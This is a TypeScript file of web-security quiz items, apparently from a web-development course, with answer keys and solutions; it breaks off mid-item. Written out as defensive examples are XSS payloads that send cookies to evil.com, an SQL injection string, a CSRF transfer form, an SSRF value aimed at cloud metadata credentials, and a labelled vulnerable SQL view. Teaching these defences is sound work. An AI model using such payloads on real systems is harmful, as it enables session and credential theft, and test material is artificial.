import {
  Question,
  QuestionType,
  Difficulty,
  Topic,
  Course,
  CodeLanguage,
} from '../types';

export const securityQuestions: Question[] = [

  // =====================================================================
  // 1. AUTHENTICATION DEEP DIVE (5 questions, topic: NEXT_AUTH)
  // =====================================================================

  {
    id: 'sec-auth-1',
    type: QuestionType.MULTIPLE_CHOICE,
    difficulty: Difficulty.INTERMEDIATE,
    topic: Topic.NEXT_AUTH,
    course: Course.WEB_DEV,
    question: 'A user clicks "Login with Google" on your Next.js app. What is the correct sequence of events in the OAuth 2.0 Authorization Code flow with PKCE?',
    options: [
      { id: 'a', text: 'Your app generates a code_verifier and code_challenge, redirects the user to Google with the challenge. Google authenticates the user, redirects back to your app with an authorization code. Your server sends the code + code_verifier to Google to exchange for access and refresh tokens.', isCorrect: true },
      { id: 'b', text: 'Your app sends the user\'s email and password directly to Google\'s API. Google returns tokens immediately without any redirects.', isCorrect: false },
      { id: 'c', text: 'Google sends tokens directly to the browser in the redirect URL. No server-side exchange is needed because PKCE replaces the need for a client secret.', isCorrect: false },
      { id: 'd', text: 'Your app fetches the user\'s Google profile using an API key, then creates a session locally. OAuth is only used if the user has 2FA enabled.', isCorrect: false },
    ],
    explanation: 'The Authorization Code flow with PKCE works in 4 steps: (1) Your app generates a random code_verifier and derives a code_challenge from it. (2) The user is redirected to Google\'s auth server with the code_challenge. (3) After the user consents, Google redirects back with a short-lived authorization code. (4) Your server exchanges the code + original code_verifier for tokens. PKCE prevents interception attacks because even if an attacker steals the authorization code, they don\'t have the code_verifier needed to exchange it. This is critical for SPAs and mobile apps where you can\'t safely store a client secret.',
    hints: [
      'PKCE adds a code_verifier/code_challenge pair to prevent authorization code interception',
      'Tokens are never sent through the browser URL -- they come from a server-to-server exchange',
    ],
    tags: ['oauth', 'pkce', 'authentication', 'google-login'],
    concepts: ['web-security-auth-tokens'],
  },

  {
    id: 'sec-auth-2',
    type: QuestionType.MULTIPLE_CHOICE,
    difficulty: Difficulty.INTERMEDIATE,
    topic: Topic.NEXT_AUTH,
    course: Course.WEB_DEV,
    question: 'A JWT looks like: eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxMjN9.SIGNATURE_HERE\n\nWhat does each of the three dot-separated parts contain, and why is the payload Base64-encoded rather than encrypted?',
    options: [
      { id: 'a', text: 'Header (user info), Payload (encrypted claims), Signature (checksum). The payload is encrypted so only your server can read the claims inside it.', isCorrect: false },
      { id: 'b', text: 'Header (algorithm + token type), Payload (claims like user_id and expiration), Signature (HMAC or RSA of header+payload). The payload is only Base64-encoded, NOT encrypted -- anyone can decode and read it. The signature doesn\'t hide the data, it proves the data hasn\'t been tampered with.', isCorrect: true },
      { id: 'c', text: 'Header (signature algorithm), Payload (Base64-encrypted user data), Signature (public key). Base64 is a form of encryption that keeps the payload secure.', isCorrect: false },
      { id: 'd', text: 'All three parts are encrypted independently. The dots just separate the encryption blocks. You need the server\'s secret key to decode any part.', isCorrect: false },
    ],
    explanation: 'A JWT has three Base64url-encoded parts separated by dots. The Header specifies the signing algorithm (e.g., HS256, RS256). The Payload contains claims -- data like user_id, email, exp (expiration), iat (issued at). The Signature is created by signing header+payload with a secret key. CRITICAL: Base64 is an encoding, NOT encryption. Anyone can decode the payload with a simple Base64 decoder. Never put sensitive data (passwords, SSNs) in a JWT payload. The signature only guarantees integrity (nobody changed the data) and authenticity (it was signed by someone with the secret key).',
    hints: [
      'Try decoding a JWT payload at jwt.io -- you\'ll see the claims in plain JSON',
      'Base64 is reversible by anyone. Encryption requires a key to reverse.',
    ],
    tags: ['jwt', 'tokens', 'base64', 'authentication'],
    concepts: ['web-security-auth-tokens'],
  },

  {
    id: 'sec-auth-3',
    type: QuestionType.MULTIPLE_CHOICE,
    difficulty: Difficulty.INTERMEDIATE,
    topic: Topic.NEXT_AUTH,
    course: Course.WEB_DEV,
    question: 'Your app uses JWT-based authentication. After login, the user gets an access token (15 min) and a refresh token (7 days). Why use two separate tokens instead of one long-lived access token?',
    options: [
      { id: 'a', text: 'Two tokens are faster because the server checks the smaller access token for most requests and only reads the refresh token during login.', isCorrect: false },
      { id: 'b', text: 'The refresh token encrypts the access token. Without both tokens together, neither one works.', isCorrect: false },
      { id: 'c', text: 'If an access token is stolen, the attacker has only 15 minutes of access. The refresh token is stored more securely (httpOnly cookie) and is only sent to ONE endpoint (/api/refresh) to get a new access token. This limits the blast radius of token theft.', isCorrect: true },
      { id: 'd', text: 'It\'s a legacy pattern from OAuth 1.0. Modern apps only need one token since JWTs are self-contained and can\'t be stolen if you use HTTPS.', isCorrect: false },
    ],
    explanation: 'The two-token strategy is about limiting damage from token theft. The access token is short-lived (15 min) and sent with every API request -- if stolen, the window of attack is small. The refresh token is long-lived (7 days) but is only sent to a single refresh endpoint, reducing exposure. When the access token expires, the client silently sends the refresh token to get a new access token -- the user never has to re-login. Store the refresh token in an httpOnly cookie (JavaScript can\'t access it), and the access token either in memory (safest) or an httpOnly cookie. NEVER store either in localStorage -- any XSS vulnerability exposes them.',
    hints: [
      'Think about what happens when a token is stolen -- how do you limit the damage?',
      'The refresh token is sent to fewer endpoints, reducing its exposure surface',
    ],
    tags: ['jwt', 'refresh-tokens', 'token-storage', 'authentication'],
    concepts: ['web-security-auth-tokens'],
  },

  {
    id: 'sec-auth-4',
    type: QuestionType.MULTIPLE_CHOICE,
    difficulty: Difficulty.INTERMEDIATE,
    topic: Topic.NEXT_AUTH,
    course: Course.WEB_DEV,
    question: 'You need to store authentication tokens in a Next.js app. A teammate suggests localStorage. What are the security tradeoffs of localStorage, sessionStorage, and httpOnly cookies for token storage?',
    options: [
      { id: 'a', text: 'localStorage is the most secure because data persists across sessions. sessionStorage is less secure because it\'s cleared when the tab closes. Cookies are the least secure because they\'re sent with every request.', isCorrect: false },
      { id: 'b', text: 'All three are equally secure as long as you use HTTPS. The choice is about convenience: localStorage for SPAs, sessionStorage for SSR, cookies for APIs.', isCorrect: false },
      { id: 'c', text: 'httpOnly cookies are obsolete because modern browsers block them. localStorage with encryption is the current best practice for token storage.', isCorrect: false },
      { id: 'd', text: 'localStorage is vulnerable to XSS (any injected script can read tokens). sessionStorage is also XSS-vulnerable but scoped to the tab. httpOnly cookies can\'t be read by JavaScript (immune to XSS) but need CSRF protection via SameSite attribute or CSRF tokens. Best practice: refresh token in httpOnly cookie, access token in memory.', isCorrect: true },
    ],
    explanation: 'XSS (Cross-Site Scripting) is the primary threat to token storage. If an attacker injects JavaScript into your page, they can run document.cookie or localStorage.getItem() to steal tokens. httpOnly cookies are NOT accessible via JavaScript -- document.cookie won\'t return them -- so XSS can\'t steal the token directly. However, cookies are automatically sent with requests, making them vulnerable to CSRF (Cross-Site Request Forgery). Set SameSite=Strict or SameSite=Lax to mitigate CSRF. The gold standard: store the refresh token in an httpOnly, Secure, SameSite=Strict cookie. Keep the access token in a JavaScript variable (memory) -- it\'s lost on page refresh but can be silently renewed via the refresh token.',
    hints: [
      'XSS lets an attacker run arbitrary JavaScript on your page. What can JavaScript access?',
      'httpOnly is a cookie flag that prevents JavaScript from reading the cookie value',
    ],
    tags: ['xss', 'csrf', 'cookies', 'token-storage', 'security'],
    concepts: ['web-security-xss', 'web-security-csrf', 'web-security-input-validation'],
  },

  {
    id: 'sec-auth-5',
    type: QuestionType.CODING,
    difficulty: Difficulty.ADVANCED,
    topic: Topic.NEXT_AUTH,
    course: Course.WEB_DEV,
    language: CodeLanguage.TYPESCRIPT,
    question: 'Implement a Next.js middleware that protects routes by checking for a valid JWT in cookies. If the token is missing or expired, redirect to /login. If valid, allow the request to proceed. Use the jose library for JWT verification.\n\nThe middleware should:\n1. Read the "access_token" from cookies\n2. Verify it using jose\'s jwtVerify with a secret key\n3. Redirect to /login if verification fails\n4. Only apply to routes under /dashboard and /api (not /login, /register, or static files)',
    starterCode: `// Import NextRequest/NextResponse from 'next/server' and jwtVerify from 'jose'
// Build JWT_SECRET = new TextEncoder().encode(process.env.JWT_SECRET || 'your-secret-key')


// export async function middleware(request) that:
//   reads 'access_token' from request.cookies.get('access_token')?.value
//   redirects to /login if absent
//   tries jwtVerify(token, JWT_SECRET); returns NextResponse.next() on success,
//   catches and redirects to /login on failure


// export const config.matcher limiting to /dashboard/:path* and /api/:path*
`,
    testCases: [
      {
        input: 'Request to /dashboard with no access_token cookie',
        expectedOutput: 'redirect to /login',
        description: 'Should redirect to /login when no token is present',
      },
      {
        input: 'Request to /dashboard with expired JWT in access_token cookie',
        expectedOutput: 'redirect to /login',
        description: 'Should redirect to /login when token is expired',
      },
      {
        input: 'Request to /dashboard with valid JWT in access_token cookie',
        expectedOutput: 'NextResponse.next()',
        description: 'Should allow the request to proceed with a valid token',
      },
      {
        input: 'Request to /login (no token)',
        expectedOutput: 'NextResponse.next()',
        description: 'Should not intercept /login route (not in matcher)',
      },
    ],
    solution: `import { NextRequest, NextResponse } from 'next/server';
import { jwtVerify } from 'jose';

const JWT_SECRET = new TextEncoder().encode(
  process.env.JWT_SECRET || 'your-secret-key'
);

export async function middleware(request: NextRequest) {
  const token = request.cookies.get('access_token')?.value;

  if (!token) {
    return NextResponse.redirect(new URL('/login', request.url));
  }

  try {
    await jwtVerify(token, JWT_SECRET);
    return NextResponse.next();
  } catch (error) {
    return NextResponse.redirect(new URL('/login', request.url));
  }
}

export const config = {
  matcher: ['/dashboard/:path*', '/api/:path*'],
};`,
    explanation: 'This middleware runs on the Edge Runtime before every matched request. Key points: (1) request.cookies.get() reads the httpOnly cookie -- middleware runs server-side so it CAN access httpOnly cookies even though client JS cannot. (2) jwtVerify from jose throws an error if the token is expired, has an invalid signature, or is malformed -- we catch all of these and redirect to /login. (3) The matcher config ensures we only check auth on protected routes, not on /login or static assets. (4) In production, JWT_SECRET must be a strong, randomly generated value stored in environment variables. Never hardcode it. This pattern works with Next.js 13+ App Router and runs at the edge for minimal latency.',
    hints: [
      'Use request.cookies.get("access_token")?.value to read the cookie',
      'jwtVerify throws an error for expired or invalid tokens -- wrap it in try/catch',
      'The matcher array uses Next.js route patterns like /dashboard/:path*',
    ],
    tags: ['nextjs', 'middleware', 'jwt', 'jose', 'authentication', 'cookies'],
    concepts: ['next-middleware', 'web-security-auth-tokens', 'web-security-csrf'],
  },

  // =====================================================================
  // 2. COMMON ATTACK VECTORS (5 questions, topic: API_DESIGN)
  // =====================================================================

  {
    id: 'sec-attack-1',
    type: QuestionType.MULTIPLE_CHOICE,
    difficulty: Difficulty.INTERMEDIATE,
    topic: Topic.API_DESIGN,
    course: Course.WEB_DEV,
    question: 'Your React app renders user-generated blog posts. A user submits a post containing: <img src="x" onerror="fetch(\'https://evil.com/steal?cookie=\'+document.cookie)">\n\nWhat type of XSS attack is this, and how does each XSS variant work?',
    options: [
      { id: 'a', text: 'This is Stored XSS -- the malicious script is saved to your database and executes for every user who views the post. Reflected XSS embeds the script in a URL parameter that gets rendered server-side. DOM XSS manipulates the page\'s JavaScript to inject content client-side (e.g., via innerHTML). React escapes JSX by default, but dangerouslySetInnerHTML bypasses this protection. Content Security Policy (CSP) headers block inline scripts even if injection occurs.', isCorrect: true },
      { id: 'b', text: 'This is Reflected XSS because the image tag reflects back from the server. Stored XSS only applies to JavaScript files stored on the server. DOM XSS is a browser bug, not an application vulnerability.', isCorrect: false },
      { id: 'c', text: 'This is DOM XSS because it manipulates an HTML element (img). React prevents all XSS by default, including dangerouslySetInnerHTML, so this attack would not work in any React app.', isCorrect: false },
      { id: 'd', text: 'This isn\'t XSS because img tags can\'t execute JavaScript. XSS only works through script tags. No additional protection is needed beyond React\'s default escaping.', isCorrect: false },
    ],
    explanation: 'Three types of XSS: (1) Stored XSS: The attacker\'s script is saved in your database (e.g., in a blog post, comment, or profile field). Every user who loads that data executes the script. Most dangerous because it affects all visitors. (2) Reflected XSS: The script is embedded in a URL (e.g., search?q=<script>...) and the server reflects it back in the response without sanitizing. Only affects users who click the malicious link. (3) DOM XSS: The page\'s own JavaScript takes untrusted data (like location.hash) and inserts it into the DOM via innerHTML, document.write, or eval. React\'s JSX auto-escapes content, but dangerouslySetInnerHTML renders raw HTML -- if you must use it, sanitize with DOMPurify first. CSP headers (Content-Security-Policy: script-src \'self\') block inline scripts, adding a crucial defense layer.',
    hints: [
      'The onerror attribute on an img tag runs JavaScript when the image fails to load',
      'The script is stored in the database and served to all users who view the post',
    ],
    tags: ['xss', 'stored-xss', 'reflected-xss', 'dom-xss', 'csp', 'react-security'],
    concepts: ['web-security-xss'],
  },

  {
    id: 'sec-attack-2',
    type: QuestionType.CODING,
    difficulty: Difficulty.BEGINNER,
    topic: Topic.API_DESIGN,
    course: Course.WEB_DEV,
    language: CodeLanguage.PYTHON,
    question: 'The following Django view has a SQL injection vulnerability. An attacker can send username=\' OR 1=1 -- to dump the entire users table.\n\n1. Identify why the vulnerable version is dangerous\n2. Fix it using parameterized queries\n3. Also show the safe ORM equivalent\n\nThe raw SQL approach is sometimes needed for complex queries that the ORM can\'t express, but it MUST use parameterized queries.',
    starterCode: `# Imports: JsonResponse from django.http; connection from django.db;
#          User from django.contrib.auth.models


# Keep the vulnerable view (f-string interpolation into the SQL) for comparison


# get_user_safe_raw(request): use query "... WHERE username = %s" and
#   cursor.execute(query, [username]) so the driver parameterises it


# get_user_safe_orm(request): use User.objects.filter(username=username)
#   .values('id', 'username', 'email') then JsonResponse({'users': list(users)}, safe=False)
`,
    testCases: [
      {
        input: 'get_user_safe_raw with parameterized query',
        expectedOutput: 'cursor.execute with params list [username]',
        description: 'Should use parameterized query with %s placeholder and params list',
      },
      {
        input: 'get_user_safe_orm with Django ORM',
        expectedOutput: 'User.objects.filter(username=username).values()',
        description: 'Should use Django ORM filter which auto-parameterizes',
      },
    ],
    solution: `from django.http import JsonResponse
from django.db import connection
from django.contrib.auth.models import User

# VULNERABLE -- DO NOT USE IN PRODUCTION
def get_user_vulnerable(request):
    username = request.GET.get('username', '')
    query = f"SELECT id, username, email FROM users WHERE username = '{username}'"
    with connection.cursor() as cursor:
        cursor.execute(query)
        rows = cursor.fetchall()
    return JsonResponse({'users': rows}, safe=False)


# FIXED: Parameterized raw SQL
def get_user_safe_raw(request):
    username = request.GET.get('username', '')
    query = "SELECT id, username, email FROM users WHERE username = %s"
    with connection.cursor() as cursor:
        cursor.execute(query, [username])
        rows = cursor.fetchall()
    return JsonResponse({'users': rows}, safe=False)


# FIXED: Django ORM (auto-parameterized)
def get_user_safe_orm(request):
    username = request.GET.get('username', '')
    users = User.objects.filter(username=username).values('id', 'username', 'email')
    return JsonResponse({'users': list(users)}, safe=False)`,
    explanation: 'SQL injection works because the vulnerable version builds the SQL string by concatenating user input directly: f"...WHERE username = \'{username}\'". An attacker sends username=\' OR 1=1 -- which produces: WHERE username = \'\' OR 1=1 --\' -- the OR 1=1 matches every row, and -- comments out the rest. The fix is parameterized queries: cursor.execute(query, [username]) sends the SQL template and values separately to the database driver. The database treats the parameter as a literal value, not as SQL syntax, so \' OR 1=1 -- is treated as a literal string to match against, not as SQL code. Django\'s ORM (User.objects.filter(username=username)) always uses parameterized queries under the hood, making it safe by default. Use raw SQL only when the ORM can\'t express your query, and ALWAYS use %s placeholders with a params list.',
    hints: [
      'The vulnerability is in the f-string that directly interpolates user input into SQL',
      'cursor.execute() accepts a second argument: a list of parameters that replace %s placeholders',
      'Django ORM\'s .filter() always uses parameterized queries internally',
    ],
    tags: ['sql-injection', 'parameterized-queries', 'django-orm', 'security'],
    concepts: ['web-security-input-validation'],
  },

  {
    id: 'sec-attack-3',
    type: QuestionType.MULTIPLE_CHOICE,
    difficulty: Difficulty.INTERMEDIATE,
    topic: Topic.API_DESIGN,
    course: Course.WEB_DEV,
    question: 'A user is logged into your banking app (bank.com). They visit a malicious site that contains:\n<form action="https://bank.com/api/transfer" method="POST">\n  <input type="hidden" name="to" value="attacker" />\n  <input type="hidden" name="amount" value="10000" />\n</form>\n<script>document.forms[0].submit()</script>\n\nWhat attack is this, and which defenses actually work?',
    options: [
      { id: 'a', text: 'This is XSS because the attacker injects a script. Using Content Security Policy headers and React\'s JSX escaping would prevent this attack entirely.', isCorrect: false },
      { id: 'b', text: 'This is CSRF (Cross-Site Request Forgery). The browser automatically attaches bank.com\'s cookies to the POST request even though it originated from a different site. Defenses: (1) SameSite=Strict or Lax on cookies prevents them from being sent on cross-site requests. (2) CSRF tokens -- a unique token per session that the attacker can\'t guess. (3) Double-submit cookie pattern. Checking the Origin/Referer header also helps.', isCorrect: true },
      { id: 'c', text: 'This is clickjacking. The attacker overlays an invisible iframe on their page. Setting X-Frame-Options: DENY prevents this attack.', isCorrect: false },
      { id: 'd', text: 'This attack won\'t work because browsers don\'t allow cross-origin form submissions. CORS would block the request automatically.', isCorrect: false },
    ],
    explanation: 'CSRF exploits the fact that browsers automatically attach cookies (including session cookies) to requests to a domain, regardless of which site initiated the request. The attacker\'s page submits a form to bank.com, and the browser sends the user\'s authentication cookies along with it. CORS does NOT prevent this -- CORS restricts reading responses, not sending requests. Form submissions and simple POST requests are not preflight-checked by CORS. Defenses: (1) SameSite cookie attribute (Lax blocks cookies on cross-site POST forms; Strict blocks them on all cross-site requests). (2) Anti-CSRF tokens: the server includes a unique token in each form that the attacker can\'t predict. (3) Check Origin/Referer headers to verify the request came from your own site. Django includes CSRF protection by default via its CsrfViewMiddleware.',
    hints: [
      'The key insight: browsers send cookies based on the destination domain, not the origin site',
      'CORS blocks reading responses, not sending requests. Forms don\'t trigger preflight checks.',
    ],
    tags: ['csrf', 'samesite', 'csrf-token', 'cookies', 'security'],
    concepts: ['web-security-csrf', 'web-security-input-validation'],
  },

  {
    id: 'sec-attack-4',
    type: QuestionType.MULTIPLE_CHOICE,
    difficulty: Difficulty.ADVANCED,
    topic: Topic.API_DESIGN,
    course: Course.WEB_DEV,
    question: `Your Next.js app has a Server Component that fetches data from an internal microservice:\n\nconst url = \`http://internal-api:8080/data?id=\${params.id}\`;\nconst res = await fetch(url);\n\nAn attacker sets params.id to "1&url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"\n\nWhat attack is this, and why are Next.js Server Components particularly at risk?`,
    options: [
      { id: 'a', text: 'This is SQL injection targeting the internal API. The &url= parameter creates a secondary query. Using parameterized queries in the internal API would prevent this.', isCorrect: false },
      { id: 'b', text: 'This is XSS because the attacker injects a URL into the page. Content Security Policy would block the request to the metadata endpoint.', isCorrect: false },
      { id: 'c', text: 'This is SSRF (Server-Side Request Forgery). The attacker manipulates the URL to make YOUR SERVER request internal resources (like AWS metadata endpoints at 169.254.169.254 which contain IAM credentials). Server Components are high-risk because they execute on the server and can reach internal networks. Prevent with URL allowlists, input validation, and never interpolating user input into URLs.', isCorrect: true },
      { id: 'd', text: 'This won\'t work because Next.js Server Components can\'t make HTTP requests to internal IPs. The fetch API automatically blocks requests to private IP ranges.', isCorrect: false },
    ],
    explanation: 'SSRF (Server-Side Request Forgery) tricks your server into making requests to unintended destinations. The AWS metadata endpoint (169.254.169.254) is a classic SSRF target -- it returns IAM credentials, instance metadata, and secrets that can be used to compromise your entire AWS infrastructure. Next.js Server Components are particularly vulnerable because: (1) They run on the server with access to internal networks. (2) They often fetch from internal APIs. (3) Developers may not realize user input flows into server-side fetch calls. Defenses: (1) Never interpolate user input directly into URLs -- validate and sanitize first. (2) Maintain an allowlist of permitted domains/IPs. (3) Block requests to private IP ranges (10.x, 172.16-31.x, 192.168.x, 169.254.x). (4) Use a URL parser to validate the final resolved URL (watch for DNS rebinding). AWS also offers IMDSv2 which requires a PUT request with a token, mitigating basic SSRF.',
    hints: [
      '169.254.169.254 is the AWS EC2 metadata endpoint -- accessible from any EC2 instance',
      'Server Components run on the server, so fetch() can reach internal services',
    ],
    tags: ['ssrf', 'server-components', 'aws', 'internal-network', 'security'],
    concepts: ['next-server-vs-client', 'web-security-input-validation'],
  },

  {
    id: 'sec-attack-5',
    type: QuestionType.CODING,
    difficulty: Difficulty.INTERMEDIATE,
    topic: Topic.API_DESIGN,
    course: Course.WEB_DEV,
    language: CodeLanguage.PYTHON,
    question: 'Implement rate limiting for a Django REST Framework API to prevent brute-force attacks. Configure:\n- Authenticated users: 100 requests per hour\n- Anonymous users: 20 requests per hour\n- A specific login endpoint: 5 attempts per minute (to prevent password brute-force)\n\nSet up the DRF throttle classes and apply them to a login view.',
    starterCode: `# settings.py — configure REST_FRAMEWORK with:
#   DEFAULT_THROTTLE_CLASSES: AnonRateThrottle and UserRateThrottle
#   DEFAULT_THROTTLE_RATES: anon=20/hour, user=100/hour, login=5/min


# throttles.py — LoginRateThrottle(AnonRateThrottle) with scope = "login"


# views.py — decorate login_view with @api_view(['POST']) and
# @throttle_classes([LoginRateThrottle])
# Body reads username/password from request.data; returns Response({'message': 'Login successful'})
`,
    testCases: [
      {
        input: 'REST_FRAMEWORK settings',
        expectedOutput: 'DEFAULT_THROTTLE_CLASSES with UserRateThrottle and AnonRateThrottle, DEFAULT_THROTTLE_RATES with user: 100/hour and anon: 20/hour',
        description: 'Should configure default throttle classes and rates in settings',
      },
      {
        input: 'LoginRateThrottle class',
        expectedOutput: 'class with scope = "login" and rate = "5/min"',
        description: 'Should create custom throttle with login scope',
      },
      {
        input: 'login_view with throttle',
        expectedOutput: '@throttle_classes([LoginRateThrottle]) decorator',
        description: 'Should apply LoginRateThrottle to the login view',
      },
    ],
    solution: `# settings.py excerpt
REST_FRAMEWORK = {
    'DEFAULT_THROTTLE_CLASSES': [
        'rest_framework.throttling.AnonRateThrottle',
        'rest_framework.throttling.UserRateThrottle',
    ],
    'DEFAULT_THROTTLE_RATES': {
        'anon': '20/hour',
        'user': '100/hour',
        'login': '5/min',
    }
}


# throttles.py
from rest_framework.throttling import AnonRateThrottle

class LoginRateThrottle(AnonRateThrottle):
    scope = 'login'


# views.py
from rest_framework.decorators import api_view, throttle_classes
from rest_framework.response import Response
from .throttles import LoginRateThrottle

@api_view(['POST'])
@throttle_classes([LoginRateThrottle])
def login_view(request):
    username = request.data.get('username')
    password = request.data.get('password')
    # ... authentication logic ...
    return Response({'message': 'Login successful'})`,
    explanation: 'Rate limiting is essential to prevent: (1) Brute-force password attacks -- without limits, an attacker can try thousands of passwords per second. (2) API abuse -- a single user overwhelming your server. (3) Credential stuffing -- automated attacks using leaked password databases. DRF\'s throttling system uses a cache backend (default: in-memory) to track request counts per client. AnonRateThrottle identifies clients by IP address. UserRateThrottle identifies by user ID (for authenticated users) or IP (for anonymous). The LoginRateThrottle extends AnonRateThrottle because login requests come from unauthenticated users. The scope = "login" maps to the "login" key in DEFAULT_THROTTLE_RATES. When the limit is exceeded, DRF returns a 429 Too Many Requests response with a Retry-After header. For production, use a Redis cache backend instead of in-memory to persist rates across server restarts and support multiple server instances.',
    hints: [
      'DEFAULT_THROTTLE_CLASSES applies globally; @throttle_classes overrides per-view',
      'LoginRateThrottle extends AnonRateThrottle because login requests are unauthenticated',
      'The scope attribute maps to the key in DEFAULT_THROTTLE_RATES',
    ],
    tags: ['rate-limiting', 'throttling', 'drf', 'brute-force', 'security'],
    concepts: ['web-security-input-validation'],
  },

  // =====================================================================
  // 3. SECURE COMMUNICATION (3 questions, topic: PATTERNS_ARCHITECTURAL)
  // =====================================================================

  {
    id: 'sec-comm-1',
    type: QuestionType.MULTIPLE_CHOICE,
    difficulty: Difficulty.BEGINNER,
    topic: Topic.PATTERNS_ARCHITECTURAL,
    course: Course.WEB_DEV,
    question: 'A user at a coffee shop logs into your app over HTTP (not HTTPS). Someone on the same WiFi network is running Wireshark. What can the attacker see, and how does TLS/HTTPS prevent this?',
    options: [
      { id: 'a', text: 'HTTP is safe on private WiFi. TLS is only needed on public networks. The attacker can see URLs but not POST body data because POST data is in the request body, not the URL.', isCorrect: false },
      { id: 'b', text: 'The attacker can see the traffic, but modern browsers encrypt sensitive form fields (password inputs) automatically even over HTTP. TLS adds extra encryption on top.', isCorrect: false },
      { id: 'c', text: 'HTTP and HTTPS transmit the same data. HTTPS just adds a padlock icon in the browser. Real security comes from the application code, not the protocol.', isCorrect: false },
      { id: 'd', text: 'Over HTTP, the attacker sees EVERYTHING in plaintext: URLs, cookies, session tokens, form data (including passwords), API responses. TLS encrypts all data in transit so the attacker sees only encrypted gibberish. TLS also verifies the server\'s identity via certificates, preventing man-in-the-middle attacks where the attacker impersonates your server.', isCorrect: true },
    ],
    explanation: 'HTTP sends everything as plaintext. On a shared network, tools like Wireshark can capture every byte: headers, cookies, login credentials, API keys, personal data. A man-in-the-middle (MITM) attacker can even modify requests and responses in transit. TLS (Transport Layer Security) provides: (1) Encryption: All data between client and server is encrypted. Even if intercepted, it\'s unreadable without the session keys. (2) Authentication: The server presents a certificate signed by a trusted Certificate Authority (CA), proving you\'re talking to the real server, not an impersonator. (3) Integrity: Data can\'t be modified in transit without detection. The TLS handshake (simplified): Client says hello with supported cipher suites -> Server responds with its certificate and chosen cipher -> Client verifies the certificate, they agree on session keys using asymmetric cryptography -> All subsequent data is encrypted with symmetric encryption (fast). Always use HTTPS in production. Use HSTS headers to tell browsers to never use HTTP for your domain.',
    hints: [
      'HTTP is like sending a postcard -- anyone who handles it can read it',
      'HTTPS is like putting the postcard in a locked box that only the recipient can open',
    ],
    tags: ['https', 'tls', 'encryption', 'mitm', 'security'],
    concepts: ['web-security-input-validation'],
  },

  {
    id: 'sec-comm-2',
    type: QuestionType.CODING,
    difficulty: Difficulty.BEGINNER,
    topic: Topic.PATTERNS_ARCHITECTURAL,
    course: Course.WEB_DEV,
    language: CodeLanguage.PYTHON,
    question: 'Configure django-cors-headers to allow your Next.js frontend (localhost:3000 in development, myapp.com in production) to make authenticated API requests with cookies.\n\nKey requirements:\n- Preflight OPTIONS requests must succeed\n- Cookies (credentials) must be included in cross-origin requests\n- Only specific origins are allowed (no wildcard *)\n- Explain why CORS_ALLOW_ALL_ORIGINS = True with credentials fails',
    starterCode: `# settings.py — add 'corsheaders' to INSTALLED_APPS and put
# 'corsheaders.middleware.CorsMiddleware' first (before CommonMiddleware)
#
# Configure these settings:
#   CORS_ALLOWED_ORIGINS = [frontend dev URL, frontend prod URL]
#     (use a list — CORS_ALLOW_ALL_ORIGINS=True conflicts with credentials,
#     so do not use wildcard)
#   CORS_ALLOW_CREDENTIALS = True  (enable cookies cross-origin)
#   CORS_ALLOW_HEADERS includes 'content-type' and 'authorization'
#   CORS_ALLOW_METHODS includes GET/POST/PUT/DELETE/OPTIONS so preflight works
`,
    testCases: [
      {
        input: 'CORS configuration for credentials',
        expectedOutput: 'CORS_ALLOW_CREDENTIALS = True with CORS_ALLOWED_ORIGINS list',
        description: 'Should set CORS_ALLOW_CREDENTIALS with specific origins (not wildcard)',
      },
      {
        input: 'Allowed headers and methods',
        expectedOutput: 'CORS_ALLOW_HEADERS includes content-type, authorization; CORS_ALLOW_METHODS includes GET, POST, PUT, DELETE, OPTIONS',
        description: 'Should configure allowed headers and methods for preflight',
      },
    ],
    solution: `# settings.py
import os

INSTALLED_APPS = [
    # ... other apps ...
    'corsheaders',
    # ...
]

MIDDLEWARE = [
    'corsheaders.middleware.CorsMiddleware',  # Must be FIRST (before CommonMiddleware)
    'django.middleware.common.CommonMiddleware',
    # ... other middleware ...
]

# CORS Configuration
CORS_ALLOWED_ORIGINS = [
    'http://localhost:3000',        # Next.js dev server
    'https://myapp.com',            # Production frontend
    'https://www.myapp.com',        # Production with www
]

# Allow cookies and auth headers to be sent cross-origin
CORS_ALLOW_CREDENTIALS = True

# Headers the frontend is allowed to send
CORS_ALLOW_HEADERS = [
    'accept',
    'accept-encoding',
    'authorization',
    'content-type',
    'dnt',
    'origin',
    'user-agent',
    'x-csrftoken',
    'x-requested-with',
]

# HTTP methods allowed for cross-origin requests
CORS_ALLOW_METHODS = [
    'DELETE',
    'GET',
    'OPTIONS',
    'PATCH',
    'POST',
    'PUT',
]`,
    explanation: 'CORS (Cross-Origin Resource Sharing) is a browser security mechanism that blocks frontend JavaScript from making requests to a different domain unless the server explicitly allows it. When your Next.js app (localhost:3000) calls your Django API (localhost:8000), the browser sends a preflight OPTIONS request first, asking "is this allowed?" The server responds with Access-Control-Allow-Origin, Access-Control-Allow-Methods, etc. Key gotcha: Access-Control-Allow-Origin: * (wildcard) does NOT work with Access-Control-Allow-Credentials: true. The browser spec requires a specific origin when credentials are involved. This prevents a malicious site from making authenticated requests to your API and reading the response. CorsMiddleware MUST come before CommonMiddleware so it can handle the preflight OPTIONS request before Django rejects it. The x-csrftoken header is needed if you use Django\'s CSRF protection with cross-origin requests.',
    hints: [
      'CORS_ALLOW_ALL_ORIGINS = True won\'t work with CORS_ALLOW_CREDENTIALS = True',
      'CorsMiddleware must be placed before CommonMiddleware in MIDDLEWARE',
      'Include x-csrftoken in allowed headers for Django CSRF compatibility',
    ],
    tags: ['cors', 'django', 'preflight', 'credentials', 'security'],
    concepts: ['web-security-cors', 'web-security-input-validation'],
  },

  {
    id: 'sec-comm-3',
    type: QuestionType.MULTIPLE_CHOICE,
    difficulty: Difficulty.ADVANCED,
    topic: Topic.PATTERNS_ARCHITECTURAL,
    course: Course.WEB_DEV,
    question: 'An attacker finds a Stored XSS vulnerability in your app\'s comment section. They inject: <script>fetch("https://evil.com/steal", {body: document.cookie})</script>\n\nBut the attack fails because your server sends this header:\nContent-Security-Policy: default-src \'self\'; script-src \'self\'; connect-src \'self\' https://api.myapp.com\n\nWhy did CSP block the attack even though the script was successfully injected into the HTML?',
    options: [
      { id: 'a', text: 'CSP blocked it twice: (1) script-src \'self\' blocks inline scripts -- the injected <script> tag won\'t execute because only scripts loaded from your own domain are allowed. (2) connect-src limits fetch/XHR destinations -- even if the script ran, fetch to evil.com would be blocked. CSP acts as a safety net that prevents XSS damage even when injection occurs.', isCorrect: true },
